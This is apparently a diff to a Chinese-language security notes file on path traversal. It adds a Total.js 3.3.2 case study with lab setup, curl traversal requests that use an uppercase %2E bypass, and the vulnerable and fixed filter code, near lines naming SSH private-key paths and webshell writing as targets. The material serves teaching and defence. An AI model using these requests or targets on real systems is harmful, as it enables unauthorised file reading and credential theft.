@@ -25,6 +25,7 @@
 
 * linux - 参考linux文件字典[dictionary/file_linux_info.txt](https://github.com/1135/dictionary/blob/master/file_linux_info.txt)
   * web目录
+    * "读取" - 读取web目录下的配置文件/应用代码等
     * "写入" - 把webshell内容写入到目标主机web目录文件中 得到webshell
   * 凭证信息
     * `/root/.ssh/id_rsa` `~/.ssh/id_rsa` **ssh私钥**
@@ -332,6 +333,55 @@ Projects Affected and Fixed
 | Apache            | DeepLearning4J                          | [10/24/2018](https://github.com/deeplearning4j/deeplearning4j/pull/6630)                                           | 1.0.0-SNAPSHOT    |               | 
 |                                                                                                                                                                                                                                 |
 
+
+
+### 例3 - 过滤不完全
+
+参考[[Total.js] Path traversal vulnerability allows to read files outside public directory](https://hackerone.com/reports/748765)
+
+代码仓库
+https://github.com/totaljs/framework
+
+
+环境搭建
+```
+git clone https://github.com/totaljs/emptyproject
+cd emptyproject
+npm install total.js@3.3.2
+node debug.js
+```
+
+漏洞利用
+```
+# 因为以下URL中并没有../ 所以不必用--path-as-is选项避免"压缩"
+curl -i "http://0.0.0.0:8000/%2E%2E/controllers/default.js"
+curl -i "http://0.0.0.0:8000/%2E%2E/public/robots.txt"
+curl -i "http://0.0.0.0:8000/%2E%2E/debug.js"
+
+# 读取.js .txt 文件成功 (无法读取没有后缀的文件 某些后缀的文件 取决于配置)
+```
+
+漏洞分析
+
+存在目录穿越漏洞的代码 第8088行 https://github.com/totaljs/framework/blob/3fd5788ef28f3caf944d76a1135ab367bc0953b8/index.js#L8088
+
+```node
+// 逻辑:如果存在特殊字符串则返回404  黑名单为 ./  .%  %2e  注意 没有%2E
+if ((c === '.' && (n === '/' || n === '%')) || (c === '%' && n === '2' && req.uri.pathname[i + 2] === 'e')) {
+//return 404
+}
+```
+
+修复之后
+```node
+const TRAVELCHARS = { e: 1, E: 1 };
+// ...
+
+// 逻辑:如果存在特殊字符串则返回404  黑名单为 ./  .%  %2e %2E
+if ((c === '.' && (n === '/' || n === '%')) || (c === '%' && n === '2' && TRAVELCHARS[req.uri.pathname[i + 2]])) {
+//return 404
+}
+```
 
 
 ### 例2 - 单次替换
